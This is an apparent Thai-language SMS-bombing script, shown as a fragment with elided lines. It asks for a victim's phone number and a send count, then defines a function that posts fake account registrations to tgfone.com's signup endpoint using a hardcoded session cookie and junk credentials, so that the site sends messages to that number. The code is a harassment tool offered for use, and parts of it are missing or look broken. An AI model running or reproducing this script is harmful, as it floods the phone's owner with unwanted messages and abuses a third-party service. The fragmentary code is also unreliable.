...
[ + ]   By Nouveau                   
	...
	''')
Phone = input(" \x1b[96mใส่เบอร์โทร  : \x1b[92m")
...
if int(Phone) <= 99999999 or int(Phone) >= 999999999:
    ...
    jam = int(input("\x1b[96m จำนวนการส่ง : \x1b[92m"))
    print()
    print()
    ...
    def send_task(phone_num):
        try:
            ...
            headers = {
                ...
                "cookie": "PHPSESSID=6d00c9f6d3b9b31a559fbc13edb560d4e571fb71;_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_gat_gtag_UA_163796127_1=1;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657955943.0;_ga=GA1.2.160165897.1657955937"
            }
            data = f"mobile_form={phone_num}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2"
            ru.post("https://www.tgfone.com/signin/add_register", headers=headers, data=data)
        except Exception:
            pass
